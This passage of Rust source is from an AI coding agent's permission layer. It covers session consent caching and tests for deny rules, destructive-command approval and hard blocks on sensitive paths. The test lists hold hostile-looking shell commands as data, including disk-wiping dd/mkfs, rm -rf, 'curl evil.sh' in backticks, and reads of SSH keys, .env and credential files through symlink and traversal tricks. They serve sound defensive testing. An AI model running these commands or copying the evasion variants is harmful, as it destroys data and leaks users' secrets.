    /// into `tar`, a `cd`), so keying on a command prefix would offer the choice
    /// exactly where it can never apply. Session-only and never persisted —
    /// "stop asking me for the rest of this session" is a statement about the
    /// sitting, not about the project.
    fn blanket_escalation_granted(&self) -> bool {
        let caches = self.session.cache.lock().unwrap();
        caches
            .get(self.identity.workspace_id())
            .is_some_and(|cache| cache.signatures.contains(BLANKET_ESCALATION_SIGNATURE))
    }

    /// Record consent for the rest of this workspace session. The epoch only
    /// advances when something was actually added, so a repeated yes does not
    /// invalidate deferred-tool receipts that are still good.
    fn remember_in_session(&self, signatures: impl IntoIterator<Item = String>) {
        let mut caches = self.session.cache.lock().unwrap();
        let cache = caches
            .entry(self.identity.workspace_id().clone())
            .or_default();
        let before = cache.signatures.len();
        cache.signatures.extend(signatures);
        if cache.signatures.len() != before {
            advance_epoch(
                &mut cache.capability_epoch,
                "workspace permission capability",
            );
        }
    }

    /// Whether a durable project rule or this workspace's session cache already
    /// consented to running these commands uncontained.
    fn escalation_remembered(&self, remember: &Remember) -> bool {
        if self
            .project
            .matches_escalation(&remember.argvs, &remember.writes)
        {
            return true;
        }
        let caches = self.session.cache.lock().unwrap();
        caches
            .get(self.identity.workspace_id())
            .is_some_and(|cache| {
                remember
                    .signatures
                    .iter()
                    .all(|signature| cache.signatures.contains(signature))
            })
    }
}

#[cfg(test)]
mod tests {
    include!("permissions/plan239_tests.rs");
    include!("permissions/plan243_tests.rs");
    include!("permissions/plan271_tests.rs");
    use super::rule::parse_rule;
    use super::testutil::ScriptedWriter;
    use super::testutil::test_cwd;
    use super::*;
    use serde_json::json;
    use std::sync::Mutex;

    /// Pops one scripted decision per confirm (Deny once exhausted) and
    /// records every request it was asked.
    struct ScriptedApprover {
        script: Mutex<Vec<Decision>>,
        asked: Mutex<Vec<ConfirmRequest>>,
    }

    impl ScriptedApprover {
        fn new(script: Vec<Decision>) -> Arc<Self> {
            Arc::new(ScriptedApprover {
                script: Mutex::new(script),
                asked: Mutex::new(Vec::new()),
            })
        }

        fn asked(&self) -> Vec<ConfirmRequest> {
            self.asked.lock().unwrap().clone()
        }

        fn ask_count(&self) -> usize {
            self.asked.lock().unwrap().len()
        }
    }

    impl Approver for ScriptedApprover {
        fn confirm(
            &self,
            req: ConfirmRequest,
        ) -> Pin<Box<dyn Future<Output = Decision> + Send + '_>> {
            self.asked.lock().unwrap().push(req);
            let mut script = self.script.lock().unwrap();
            let decision = if script.is_empty() {
                Decision::Deny
            } else {
                script.remove(0)
            };
            Box::pin(async move { decision })
        }
    }

    fn gate_with_writer(
        mode: Mode,
        approver: Arc<ScriptedApprover>,
        writer: Arc<ScriptedWriter>,
    ) -> Permissions {
        let identity = crate::project::WorkspaceIdentity::resolve(&test_cwd());
        let project_id = identity.project_id().unwrap().clone();
        let writer: Arc<dyn ProjectPermissionWriter> = writer;
        Permissions::from_layers(
            Arc::new(GlobalPermissionPolicy::empty()),
            Arc::new(ProjectPermissionPolicy::available(
                project_id,
                ProjectPolicySnapshot::empty(),
                Some(writer),
            )),
            Arc::new(PermissionSession::new(mode, Some(approver))),
            identity,
        )
    }

    fn rules(allow: &[&str], deny: &[&str], ask: &[&str]) -> PermissionRules {
        let v = |s: &[&str]| s.iter().map(|x| x.to_string()).collect();
        PermissionRules {
            allow: v(allow),
            deny: v(deny),
            ask: v(ask),
        }
    }

    fn gate(mode: Mode, r: PermissionRules, approver: Arc<ScriptedApprover>) -> Permissions {
        Permissions::new(mode, &r, test_cwd(), Some(approver)).unwrap()
    }

    async fn ok(p: &Permissions, name: &str, input: Value) -> bool {
        p.check(name, &input, 0).await.is_ok()
    }

    fn bash(cmd: &str) -> Value {
        json!({"command": cmd})
    }

    fn file(path: &str) -> Value {
        json!({"path": path, "content": "x"})
    }

    // ── layer 9: read-only self-verdict ────────────────────────────────

    #[tokio::test]
    async fn read_only_calls_skip_the_approver() {
        let approver = ScriptedApprover::new(vec![]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        assert!(ok(&p, "read_file", json!({"path": "x"})).await);
        assert!(ok(&p, "grep", json!({"pattern": "fn main"})).await);
        assert!(ok(&p, "glob", json!({"pattern": "**/*.rs"})).await);
        assert!(ok(&p, "bash_output", json!({"bash_id": "bg-1"})).await);
        assert!(ok(&p, "stop_bash", json!({"bash_id": "bg-1"})).await);
        assert!(ok(&p, "run_agent", json!({"prompt": "go"})).await);
        assert!(ok(&p, "tool_search", json!({"query": "select:x"})).await);
        assert!(ok(&p, "skill", json!({"name": "fixture"})).await);
        assert!(ok(&p, "list_mcp_resources", json!({})).await);
        assert!(ok(&p, "todo_write", json!({"todos": []})).await);
        assert!(ok(&p, "bash", bash("git status && ls | wc -l")).await);
        assert!(ok(&p, "bash", bash("sed -n 1,20p f.rs")).await);
        assert_eq!(approver.ask_count(), 0);
    }

    #[tokio::test]
    async fn mcp_resource_reads_follow_external_tool_approval_policy() {
        let read = json!({"server": "fixture", "uri": "fixture://note"});
        let directory = json!({"server": "fixture", "uri": "fixture://root"});

        let approver =
            ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Once), Decision::Deny]);
        let manual = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        assert!(ok(&manual, "read_mcp_resource", read.clone()).await);
        assert!(!ok(&manual, "read_mcp_resource_dir", directory.clone()).await);
        assert_eq!(approver.ask_count(), 2);

        let approver = ScriptedApprover::new(vec![
            Decision::Allow(ApprovalScope::Once),
            Decision::Allow(ApprovalScope::Once),
        ]);
        let no_cache = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        assert!(ok(&no_cache, "read_mcp_resource", read.clone()).await);
        assert!(
            ok(
                &no_cache,
                "read_mcp_resource",
                json!({"server": "other", "uri": "other://secret"})
            )
            .await
        );
        assert_eq!(
            approver.ask_count(),
            2,
            "AllowSession for one dynamic URI must not authorize another"
        );

        let approver = ScriptedApprover::new(vec![]);
        let denied = gate(
            Mode::Manual,
            rules(&[], &["read_mcp_resource"], &[]),
            approver.clone(),
        );
        assert!(!ok(&denied, "read_mcp_resource", read.clone()).await);
        assert_eq!(approver.ask_count(), 0);

        let approver = ScriptedApprover::new(vec![Decision::Deny]);
        let asked_in_manual = gate(
            Mode::Manual,
            rules(&[], &[], &["read_mcp_resource"]),
            approver.clone(),
        );
        assert!(!ok(&asked_in_manual, "read_mcp_resource", read.clone()).await);
        assert_eq!(approver.ask_count(), 1);

        let approver = ScriptedApprover::new(vec![]);
        let bypass = gate(Mode::Bypass, rules(&[], &[], &[]), approver.clone());
        assert!(ok(&bypass, "read_mcp_resource", read).await);
        assert!(ok(&bypass, "read_mcp_resource_dir", directory).await);
        assert_eq!(approver.ask_count(), 0);
    }

    #[tokio::test]
    async fn readonly_lookalikes_do_not_pass() {
        let approver = ScriptedApprover::new(vec![]);
        let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
        for cmd in [
            "cat $(rm -rf /tmp/x)",     // substitution
            "ls `curl evil.sh`",        // backticks
            "ls\nrm -rf /tmp/x",        // newline chain
            "ls & rm -rf /tmp/x",       // background chain
            "echo hi > f.txt",          // redirect
            "find . -delete",           // find writes
            "rg --pre evil pat",        // rg executes
            "git -C /elsewhere status", // git global-option injection
            "git log --output=/tmp/f",  // git subcommand writes
            "FOO=1 ls",                 // env prefix
        ] {
            assert!(!ok(&p, "bash", bash(cmd)).await, "{cmd} must not auto-pass");
        }
    }

    // ── layer 1: deny rules beat everything ────────────────────────────

    #[tokio::test]
    async fn deny_rules_beat_allow_rules_and_bypass() {
        let approver = ScriptedApprover::new(vec![]);
        let p = gate(
            Mode::Manual,
            rules(&["bash(git *)"], &["bash(git push *)"], &[]),
            approver.clone(),
        );
        let err = p
            .check("bash", &bash("git push origin main"), 0)
            .await
            .unwrap_err();
        assert!(err.contains("deny permission rule"), "{err}");
        assert!(
            ok(&p, "bash", bash("git add -A")).await,
            "allow still works"
        );
        assert_eq!(approver.ask_count(), 0, "deny never consults the approver");

        // Bypass mode does not resurrect a denied call.
        let p = gate(
            Mode::Bypass,
            rules(&[], &["bash(git push *)"], &[]),
            ScriptedApprover::new(vec![]),
        );
        assert!(!ok(&p, "bash", bash("git push origin main")).await);
        assert!(
            ok(&p, "bash", bash("make anything")).await,
            "bypass allows the rest"
        );
    }

    #[tokio::test]
    async fn deny_matches_any_segment_and_strips_wrappers() {
        let approver = ScriptedApprover::new(vec![]);
        let p = gate(
            Mode::Manual,
            rules(&[], &["bash(rm *)"], &[]),
            approver.clone(),
        );
        // one denied segment poisons the chain; wrappers cannot dodge it
        assert!(!ok(&p, "bash", bash("ls && rm x")).await);
        assert!(!ok(&p, "bash", bash("sudo rm x")).await);
        assert!(!ok(&p, "bash", bash("env FOO=1 rm x")).await);
        assert!(!ok(&p, "bash", bash("timeout 5s rm x")).await);
        assert!(!ok(&p, "bash", bash("xargs rm")).await);
        assert_eq!(approver.ask_count(), 0);

        // whole-tool and path-glob deny forms
        let p = gate(
            Mode::Manual,
            rules(
                &["write_file"],
                &["write_file(secrets/**)", "run_agent"],
                &[],
            ),
            ScriptedApprover::new(vec![]),
        );
        assert!(!ok(&p, "write_file", file("secrets/key.pem")).await);
        assert!(ok(&p, "write_file", file("src/main.rs")).await);
        assert!(!ok(&p, "run_agent", json!({"prompt": "x"})).await);
    }

    // ── layer 5: manual 的风险审批 ────────────────────────────────────

    #[tokio::test]
    async fn destructive_commands_ask_in_manual_even_over_allowlist() {
        let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Once)]);
        let p = gate(
            Mode::Manual,
            rules(&["bash(rm *)"], &[], &[]),
            approver.clone(),
        );
        assert!(ok(&p, "bash", bash("rm -rf build")).await);
        let asked = approver.asked();
        assert_eq!(asked.len(), 1, "manual 下 allow 规则不能跳过危险操作审批");
        assert!(asked[0].description.contains("[destructive]"));
        assert_eq!(asked[0].approval_scopes, vec![ApprovalScope::Once]);
        assert_eq!(asked[0].remember_rules, None);

        // second time: deny (script exhausted) → the call is refused
        assert!(!ok(&p, "bash", bash("rm -rf build")).await);
    }

    #[tokio::test]
    async fn irreversible_commands_require_approval_in_manual() {
        for command in [
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sdb1",
            "shred secret.txt",
            "sudo dd of=/dev/sda",
        ] {
            let approver = ScriptedApprover::new(vec![Decision::Deny]);
            let p = gate(Mode::Manual, rules(&[], &[], &[]), approver.clone());
            assert!(!ok(&p, "bash", bash(command)).await, "{command}");
            assert_eq!(approver.ask_count(), 1, "{command}");
            assert!(
                approver.asked()[0].description.contains("[destructive]"),
                "{command}"
            );
        }

        // Reading without a destination, and the two git commands kloop itself
        // reaches for: bypass runs them as before.
        let approver = ScriptedApprover::new(vec![]);
        let p = gate(Mode::Bypass, rules(&[], &[], &[]), approver.clone());
        for command in ["dd if=/dev/urandom", "git clean -fdx", "git reset --hard"] {
            assert!(ok(&p, "bash", bash(command)).await, "{command}");
        }
        assert_eq!(approver.ask_count(), 0);
    }

    #[tokio::test]
    async fn opaque_bash_is_not_auto_run_in_manual() {
        let approver = ScriptedApprover::new(vec![Decision::Deny]);
        let p = gate(
            Mode::Manual,
            rules(&[], &["bash(rm *)"], &[]),
            approver.clone(),
        );
        // 动态目标仍 opaque；局部命令证据足以命中 deny，不必等完整授权分析。
        assert!(!ok(&p, "bash", bash("rm -rf build > \"$LOG\"")).await);
        assert_eq!(approver.ask_count(), 0, "opaque 不得隐藏已知的 deny 前缀");
        // 固定输出与纯流重定向也命中同一规则。
        assert!(!ok(&p, "bash", bash("rm -rf build > cleanup.log")).await);
        assert!(!ok(&p, "bash", bash("rm -rf build > /dev/null")).await);
        assert_eq!(
            approver.ask_count(),
            0,
            "a parsed `rm` is denied by the rule, without a question"
        );
        // A parseable, non-destructive command still auto-runs with no prompt.
        assert!(ok(&p, "bash", bash("ls -la")).await);
        assert_eq!(
            approver.ask_count(),
            0,
            "manual 下已知只读的 Bash 仍直接放行"
        );
    }

    #[tokio::test]
    async fn sensitive_paths_ask_every_time_and_never_remember() {
        let approver = ScriptedApprover::new(vec![
            Decision::Allow(ApprovalScope::Once),
            Decision::Allow(ApprovalScope::Once),
        ]);
        let p = gate(
            Mode::Manual,
            rules(&["write_file"], &[], &[]),
            approver.clone(),
        );
        for path in [".git/hooks/pre-commit", "../proj/.git/config"] {
            assert!(ok(&p, "write_file", file(path)).await, "{path}");
        }
        let asked = approver.asked();
        assert_eq!(
            asked.len(),
            2,
            "AllowSession must not stick for sensitive paths"
        );
        assert!(
            asked
                .iter()
                .all(|r| r.description.contains("[sensitive path]"))
        );
        assert!(asked.iter().all(|r| r.remember_rules.is_none()));

        // more of the sensitive list, incl. escapes out of cwd
        let approver = ScriptedApprover::new(vec![]);
        let p = gate(
            Mode::Manual,
            rules(&["write_file"], &[], &[]),
            approver.clone(),
        );
        for path in [
            "/home/u/.bashrc",
            ".env.local",
            "sub/.kloop/config.toml",
            "/x/.ssh/id_rsa",
        ] {
            assert!(!ok(&p, "write_file", file(path)).await, "{path}");
        }
        assert_eq!(approver.ask_count(), 4);
    }

    /// The spill exemption is the model reading back its own oversized output.
    /// It must not become a way into the store: the credential, the transcripts,
    /// a non-spill file under `offload/`, a `..` spelling, and a second `.kloop`
    /// mention riding along in the same command all stay blocked.
    #[tokio::test]
    async fn spilled_output_is_readable_but_the_exemption_does_not_widen() {
        let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Once); 16]);
        let p = gate(Mode::Bypass, rules(&[], &[], &[]), approver.clone());
        let store = "/home/u/.kloop/projects/v1/p1_abc";

        for command in [
            format!("wc -c {store}/offload/off-11111111111.txt"),
            format!("python3 -c 'print(1)' < {store}/offload/off-11111111112.txt"),
            format!("cat {store}/offload/bg-11111111113.out"),
        ] {
            assert!(
                ok(&p, "bash", json!({"command": command})).await,
                "spilled output must be readable: {command}"
            );
        }
        assert!(
            ok(
                &p,
                "read_file",
                json!({"path": format!("{store}/offload/off-11111111111.txt")})
            )
            .await
        );

        for command in [
            // The credential and the transcripts are what the deny is for.
            "cat /home/u/.kloop/config.toml".to_string(),
            format!("cat {store}/sessions/20260101-000000.jsonl"),
            // Not a spill file, merely sitting next to one.
            format!("cat {store}/offload/notes.txt"),
            format!("cat {store}/offload/off-11111111111.txt.bak"),
            // Traversal forfeits the exemption, as it does for worktrees.
            format!("cat {store}/offload/../../../config.toml"),
            format!("cat {store}/offload/off-11111111111.txt/../../config.toml"),
            // Masking one token must not unmask another in the same command.
            format!("cat {store}/offload/off-11111111111.txt /home/u/.kloop/config.toml"),
            format!("cat {store}/offload/off-11111111111.txt; cat ~/.kloop/config.toml"),
        ] {
            assert!(
                !ok(&p, "bash", json!({"command": command})).await,
                "must stay blocked: {command}"
            );
        }
        assert!(
            !ok(
                &p,
                "read_file",
                json!({"path": format!("{store}/offload/notes.txt")})
            )
            .await
        );
    }

    #[tokio::test]
    async fn sensitive_reads_are_hard_blocked_before_sandbox_and_bypass() {
        let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Once); 8]);
        let p = gate(Mode::Bypass, rules(&[], &[], &[]), approver.clone());
        assert!(!ok(&p, "read_file", json!({"path": ".kloop/config.toml"})).await);
        for command in [
            "cat ~/.kloop/config.toml",
            "base64 /work/proj/.kloop/config.toml",
            "head -n 2 sub/.kloop/config.toml",
            "rg token ~/.kloop",
            "python3 -c 'print(open(\"/work/proj/.kloop/config.toml\").read())'",
        ] {
            assert!(
                p.check_call("bash", &bash(command), 0, /*sandbox_auto_allow*/ true)
                    .await
                    .is_err(),
                "sensitive command escaped: {command}"
            );
        }
        assert_eq!(
            approver.ask_count(),
            0,
            "sensitive reads are not approvable"
        );
    }

    #[tokio::test]
    async fn repository_size_and_find_prune_call_passes_sensitive_read_gate() {
        let command = r#"cd refs/sample && echo "== top dirs"; du -sh packages/* apps/* 2>/dev/null | sort -h | tail -40; echo "== total"; du -sh .; echo "== ts loc"; find . -path ./.git -prune -o -type f \( -name '*.ts' -o -name '*.tsx' \) -print | wc -l"#;
        for mode in [Mode::Manual, Mode::Bypass] {
            for sandbox_auto_allow in [false, true] {
                let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Once)]);
                let p = gate(mode, rules(&[], &[], &[]), approver.clone());
                assert_eq!(
                    p.check_call("bash", &bash(command), 0, sandbox_auto_allow)
                        .await,
                    Ok(None)
                );
                assert_eq!(
                    approver.ask_count(),
                    usize::from(mode == Mode::Manual && !sandbox_auto_allow)
                );
            }
        }
    }

    #[tokio::test]
    async fn find_match_patterns_are_not_sensitive_reads() {
        let approver = ScriptedApprover::new(vec![]);
        for mode in [Mode::Manual, Mode::Plan, Mode::Bypass] {
            let p = gate(mode, rules(&[], &[], &[]), approver.clone());
            for command in [
                "find . -path './.git' -prune -o -type f -print",
                "/usr/bin/find . src -ipath '*/.git/*' -prune -or -print",
                r"find . \( -path ./.git -o -name '.env*' \) -prune -o -print",
                "find . '(' -path './.git/*' -or -iname '.git' ')' -prune -o -print",
                r"find -P . \! \( -path '*/.git/*' -o -name .git \) -type f -print0",
                "find . -maxdepth 3 -type f -not -path './.git/*' -print",
                "find -E -f src tests -iregex '.*/.git/.*' -prune -o -print",
                "find . -name .git -prune -o -path ./.git -prune -o -print",
                "find . -wholename './.git/*' -a -iwholename './.git/*' -print",
                "find . -lname './.git/config' -o -ilname './.git/config' -print",
                "find . -path ./.git -prune -o -depth -print",
                "find -d . -path ./.git -prune -o -print",
                "find . -path ./.git -print",
                "find . -path ./.git -prune -a -print",
                "find . -path ./.git -prune -o -path ./.git/config -print",
            ] {
                for sandbox_auto_allow in [false, true] {
                    assert_eq!(
                        p.check_call("bash", &bash(command), 0, sandbox_auto_allow)
                            .await,
                        Ok(None),
                        "{mode:?}: {command}"
                    );
                }
            }
        }
        assert_eq!(approver.ask_count(), 0);
    }

    #[tokio::test]
    async fn find_match_patterns_never_exempt_sensitive_reads() {
        let approver = ScriptedApprover::new(vec![]);
        for mode in [Mode::Manual, Mode::Bypass] {
            let p = gate(mode, rules(&[], &[], &[]), approver.clone());
            for command in [
                "cat ./.git/config",
                "find . -path ./.git -prune -o -print; cat ./.git/config",
                "find . -path ./.git -prune -o -exec cat '{}' ';'",
                "find . -path ./.git -prune -o -execdir cat '{}' ';'",
                "find . -path ./.git -prune -o -ok cat '{}' ';'",
                "find . -path ./.git -prune -o -okdir cat '{}' ';'",
                "find . -path ./.git -prune -o -fprint result.txt",
                "find . -path ./.git -prune -o -fprintf result.txt '%p'",
                "find . -path ./.git -prune -o -fls result.txt",
                "find . -path ./.git -prune -o -delete",
                "find . -newer -path ./.git -prune -o -print",
                "find . -path ./.git -unknown -print",
                "find . -path ./.git -prune -o",
                "find . -path ./.git -prune -o -name",
                "find . '(' -path ./.git -print",
                "find . -path ./.git ')' -print",
                "find . -path ./.git -o -o -print",
                "cat -path ./.git -prune -o",
                "find . -path ./.git -prune -o -print; cat ~/.kloop/config.toml",
                "find . -path ~/.kloop/config.toml -prune -o -print",
            ] {
                for sandbox_auto_allow in [false, true] {
                    assert_eq!(
                        p.check_call("bash", &bash(command), 0, sandbox_auto_allow)
                            .await,
                        Err("bash: reading this sensitive path is blocked. Do not retry or work around the protection.".to_string()),
                        "{mode:?}: {command}"
                    );
                }
            }
        }
        assert_eq!(approver.ask_count(), 0);
    }

    #[tokio::test]
    async fn match_pattern_arguments_are_not_sensitive_reads_across_commands() {
        let approver = ScriptedApprover::new(vec![]);
        for mode in [Mode::Manual, Mode::Plan, Mode::Bypass] {
            let p = gate(mode, rules(&[], &[], &[]), approver.clone());
            for command in [
                "find -O2 . -path ./.git -prune -o -print",
                r"find . -newermt '2024-01-01' -path ./.git -prune -o -print",
                "grep -rn '.env' src",
                "grep -e './.git/config' docs",
                "grep --include='*.rs' -rn '.env*' .",
                "rg -n '.env' .",
                "rg -g '!**/.git/*' TODO .",
                "rg --glob='!**/.git/*' TODO .",
                "du -sh --exclude=./.git .",
                "tree -I .git",
                "tree -aI .git",
                "tree -L2 -I .git",
                "tree --fromfile -I .git paths.txt",
                "echo .env",
            ] {
                for sandbox_auto_allow in [false, true] {
                    assert_eq!(
                        p.check_call("bash", &bash(command), 0, sandbox_auto_allow)
                            .await,
                        Ok(None),
                        "{mode:?}: {command}"
                    );
                }
            }
        }
        assert_eq!(approver.ask_count(), 0);
    }

    #[tokio::test]
    async fn tree_depth_suffixes_keep_match_patterns_exempt() {
        let approver = ScriptedApprover::new(vec![]);
        for mode in [Mode::Manual, Mode::Plan, Mode::Bypass] {
            let p = gate(mode, rules(&[], &[], &[]), approver.clone());
            for command in [
                "tree -L2a -I .git .",
                "tree -L2h -I .git .",
                "tree -L2U -I .git .",
                "tree -L12ahU -I .git .",
                "tree -aL12hU -I .git .",
            ] {
                for sandbox_auto_allow in [false, true] {
                    assert_eq!(
                        p.check_call("bash", &bash(command), 0, sandbox_auto_allow)
                            .await,
                        Ok(None),
                        "{mode:?}: {command}"
                    );
                }
            }
        }
        assert_eq!(approver.ask_count(), 0);
    }

    #[tokio::test]
    async fn tree_option_boundaries_keep_sensitive_inputs_blocked() {
        let approver = ScriptedApprover::new(vec![]);
        for mode in [Mode::Manual, Mode::Plan, Mode::Bypass] {
            let p = gate(mode, rules(&[], &[], &[]), approver.clone());
            for command in [
                "tree --fromfile -I -P .env",
                "tree --fromfile README.md -Ia -P .env",
                "tree --fromfile -- -P .env",
                "tree --fromfile -I .git README.md .env",
                "tree -Ia -P .git",
                "tree --fromfile README.md -La 1 -I -P .env",
                "tree --fromfile -L2ahU -I .git .env",
                "tree -L2P .git .",
                "tree --fromfile -L2aP .git .env",
                "tree --fromfile -L2ao .git .env",
            ] {
                for sandbox_auto_allow in [false, true] {
                    assert_eq!(
                        p.check_call("bash", &bash(command), 0, sandbox_auto_allow)
                            .await,
                        Err("bash: reading this sensitive path is blocked. Do not retry or work around the protection.".to_string()),
                        "{mode:?}: {command}"
                    );
                }
            }
        }
        assert_eq!(approver.ask_count(), 0);
    }

    #[tokio::test]
    async fn reader_arguments_remain_sensitive_reads() {
        let approver = ScriptedApprover::new(vec![]);
        for mode in [Mode::Manual, Mode::Bypass] {
            let p = gate(mode, rules(&[], &[], &[]), approver.clone());
            for command in [
                "grep -f ./.git/config src",
                "grep --exclude-from=./.git/config -rn x .",
                "rg --ignore-file=./.git/config -n x .",
                "rg --pre 'cat ./.git/config' x .",
                "rg --future-flag ./.git/config",
                "du -X ./.git/config .",
                "du --files0-from=./.git/config",
                "tree --fromfile ./.git/config",
                "find . -files0-from ./.git/config",
                "sudo find . -path ./.git -prune -o -print",
                "xargs find . -path ./.git -prune -o -print",
            ] {
                for sandbox_auto_allow in [false, true] {
                    assert_eq!(
                        p.check_call("bash", &bash(command), 0, sandbox_auto_allow)
                            .await,
                        Err("bash: reading this sensitive path is blocked. Do not retry or work around the protection.".to_string()),
                        "{mode:?}: {command}"
                    );
                }
            }
        }
        assert_eq!(approver.ask_count(), 0);
    }

    #[tokio::test]
    async fn repo_metadata_access_is_not_a_sensitive_read() {
        let approver = ScriptedApprover::new(vec![]);
        for mode in [Mode::Manual, Mode::Plan, Mode::Bypass] {
            let p = gate(mode, rules(&[], &[], &[]), approver.clone());
            for command in [
                "ls -l .git/config",
                "ls -la .git",
                "stat .git/config",
                "du -sh .git",
                "tree -L1 .git",
                "tree -L2a .git",
                "find .git",
                "find .git -maxdepth 1 -print",
                "find ./.git -path ./.git -prune -o -print",
                "find -f ./.git . -path ./.git -prune -o -print",
                "find . -path ./.git -newer ./.git/config -print",
                "find . -newer ./.git/config -print0",
                "tree -I --gitignore .git",
                "tree -I '-old*' -P .git .",
            ] {
                for sandbox_auto_allow in [false, true] {
                    assert_eq!(
                        p.check_call("bash", &bash(command), 0, sandbox_auto_allow)
                            .await,
                        Ok(None),
                        "{mode:?}: {command}"
                    );
                }
            }
        }
        assert_eq!(approver.ask_count(), 0);
    }

    #[tokio::test]
    async fn content_and_secret_metadata_stay_hard_blocked() {
        let approver = ScriptedApprover::new(vec![]);
        for mode in [Mode::Manual, Mode::Bypass] {
            let p = gate(mode, rules(&[], &[], &[]), approver.clone());
            for command in [
                "cat .git/config",
                "head -1 .git/config",
                "grep -rn branch .git",
                "du --files0-from=.git/config",
                "du -sX .git/config .",
                "tree --fromfile .git/config",
                "tree --gitignore .git",
                "tree -R -L 1 -H . .git",
                "tree -so .git/config .",
                "tree --compress -- -o .git/config .",
                "tree -o .git/config .",
                "find .git -files0-from .git/config",
                "find .git -exec cat '{}' ';'",
                "find .git -delete",
                "find .git -unknown -print",
                "tree -Ia -P .git",
                "ls -l .kloop/config.toml",
                "ls -l .env",
                "stat ~/.ssh/id_rsa",
                "ls -l .git/config; cat .env",
            ] {
                for sandbox_auto_allow in [false, true] {
                    assert_eq!(
                        p.check_call("bash", &bash(command), 0, sandbox_auto_allow)
                            .await,
                        Err("bash: reading this sensitive path is blocked. Do not retry or work around the protection.".to_string()),
                        "{mode:?}: {command}"
                    );
                }
            }
        }
        assert_eq!(approver.ask_count(), 0);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn sensitive_reads_follow_symlinks_to_the_canonical_target() {
        let root =
            std::env::temp_dir().join(format!("kloop-sensitive-read-link-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let secret_dir = root.join(".ssh");
        std::fs::create_dir_all(&secret_dir).unwrap();
        let secret = secret_dir.join("id_rsa");
        std::fs::write(&secret, "SENTINEL").unwrap();
        let alias = root.join("innocent.toml");
        std::os::unix::fs::symlink(&secret, &alias).unwrap();

        let approver = ScriptedApprover::new(vec![Decision::Allow(ApprovalScope::Once); 2]);
        let permissions = Permissions::new(
            Mode::Bypass,
            &rules(&[], &[], &[]),
            root.clone(),
            Some(approver.clone()),
        )
        .unwrap();
        assert!(
            permissions
                .check("read_file", &json!({"path": alias}), 0)
                .await
                .is_err()
        );
        assert!(
            permissions
                .check_call(
                    "bash",
                    &bash(&format!("cat {}", root.join("innocent.toml").display())),
                    0,
                    true,
                )
                .await
                .is_err()
        );
        assert_eq!(approver.ask_count(), 0);
        let _ = std::fs::remove_dir_all(root);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn missing_targets_follow_parent_symlinks_for_sensitive_and_deny_checks() {
        let root = std::env::temp_dir().join(format!(
            "kloop-sensitive-parent-link-{}",
            std::process::id()
        ));
        let _ = std::fs::remove_dir_all(&root);
        let hooks = root.join(".git/hooks");
        std::fs::create_dir_all(&hooks).unwrap();
        std::os::unix::fs::symlink(&hooks, root.join("innocent")).unwrap();

        let approver = ScriptedApprover::new(vec![Decision::Deny]);
        let permissions = Permissions::new(
            Mode::Manual,
            &rules(&[], &[], &[]),
            root.clone(),
            Some(approver.clone()),
        )
        .unwrap();
        assert!(
            permissions
                .check("write_file", &file("innocent/pre-commit"), 0)
                .await
                .is_err()
        );
        let asked = approver.asked();
        assert_eq!(asked.len(), 1, "sensitive alias must not auto-allow");
        assert!(asked[0].description.contains("[sensitive path]"));
        assert!(asked[0].description.contains(".git/hooks/pre-commit"));

        let denied = Permissions::new(
            Mode::Manual,
            &rules(&[], &["write_file(.git/**)"], &[]),
            root.clone(),
            None,
        )
        .unwrap();
        let error = denied
            .check("write_file", &file("innocent/pre-commit"), 0)
            .await
            .unwrap_err();
        assert!(
            error.contains("blocked by a deny permission rule"),
            "{error}"
        );
        let _ = std::fs::remove_dir_all(root);
    }

    #[tokio::test]
    async fn bypass_skips_all_tool_approval_prompts() {
        let cases = [
            ("bash", bash("make install")),
            (
                "bash",
                json!({"command": "make install", "disable_sandbox": true}),
            ),
            (
                "bash",
                json!({
                    "command": "export QUERY=\"${TOOLS_HOME:-$HOME/.tools}/query\"\n\"$QUERY\" rename",
                    "disable_sandbox": true
                }),
            ),
            ("bash", bash("echo result > output.txt")),
            ("bash", bash("rm -rf build")),
            ("bash", bash("dd if=/dev/zero of=/dev/sda")),
            ("bash", bash("mkfs.ext4 /dev/sdb1")),
            ("bash", bash("shred output.txt")),
            ("write_file", file(".git/config")),
            (
                "edit_file",
                json!({"path": ".env.local", "old_string": "a", "new_string": "b"}),
            ),
            ("notebook_edit", json!({"notebook_path": ".aws/note.ipynb"})),
            ("enter_worktree", json!({"path": "existing"})),
            ("exit_worktree", json!({"action": "remove"})),
            ("powershell", json!({"command": "Set-Content x y"})),
            (
                "powershell",
                json!({"command": r"Get-Content $env:USERPROFILE\.ssh\id_rsa"}),
            ),
            ("run_agent", json!({"prompt": "work"})),
            ("memory__create_entities", json!({})),
            (
                "read_mcp_resource",
                json!({"server": "fixture", "uri": "fixture://note"}),
            ),
        ];
        for ask_rules in [
            vec![],
            vec![
                "bash",
                "write_file",
                "edit_file",
                "notebook_edit",
                "enter_worktree",
                "exit_worktree",
                "powershell",
                "run_agent",
                "memory__create_entities",
                "read_mcp_resource",
            ],
        ] {
            let approver = ScriptedApprover::new(vec![]);
            for approver_available in [true, false] {
                let permissions = Permissions::new(
                    Mode::Bypass,
                    &rules(&[], &[], &ask_rules),
                    test_cwd(),
                    approver_available.then(|| approver.clone() as Arc<dyn Approver>),
                )
                .unwrap();
                for (name, input) in &cases {
                    for sandbox_auto_allow in [false, true] {
                        assert_eq!(
                            permissions
                                .check_call(name, input, 1, sandbox_auto_allow)
                                .await,
                            Ok(None),
                            "{name}: {input}, ask={ask_rules:?}, approver={approver_available}, sandbox={sandbox_auto_allow}"
                        );
                    }
                }
            }
            assert_eq!(approver.asked(), vec![]);
        }
    }

    #[tokio::test]
    async fn bypass_cannot_override_whole_tool_deny_for_opaque_shells() {
        let approver = ScriptedApprover::new(vec![]);
        let permissions = gate(
            Mode::Bypass,
            rules(
                &["bash", "powershell"],
                &["bash", "powershell"],
                &["bash", "powershell"],
            ),
            approver.clone(),
